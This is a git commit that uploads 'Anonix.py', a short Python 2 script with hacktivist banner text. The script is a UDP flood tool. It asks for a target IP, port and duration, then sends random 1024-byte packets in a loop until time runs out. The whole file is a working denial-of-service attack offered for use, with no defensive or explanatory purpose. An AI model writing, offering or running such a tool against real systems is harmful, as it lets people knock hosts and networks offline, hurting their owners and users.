5e4556c93b09757e463c6c7e76234092b024362b
Bennitenni111 <63103053+Bennitenni111@users.noreply.github.com>
2020-06-14 15:11:44 -0500

    Add files via upload

---
+++ Anonix.py
@@ -0,0 +1,33 @@
+import os
+import sys
+import time
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+bytes = random._urandom(1024)
+
+os.system("clear")
+print("Anonix.xyz")
+print(">>We are legions<<")
+print(">>We do not forgive!<<")
+print(">>We do not forget<<")
+print("|=================================|")
+ip = raw_input("Target's IP: ")
+port = input("Port: ")
+dur = input("Time: ")
+timeout = time.time() + dur
+sent = 0
+
+while True:
+	try:
+		if time.time() > timeout:
+			break
+		else:
+			pass
+		sock.sendto(bytes,(ip, port))
+		sent = sent + 1
+		print "Sent %s packets to %s through port %s"%(sent, ip, port)
+	except KeyboardInterrupt:
+		sys.exit()
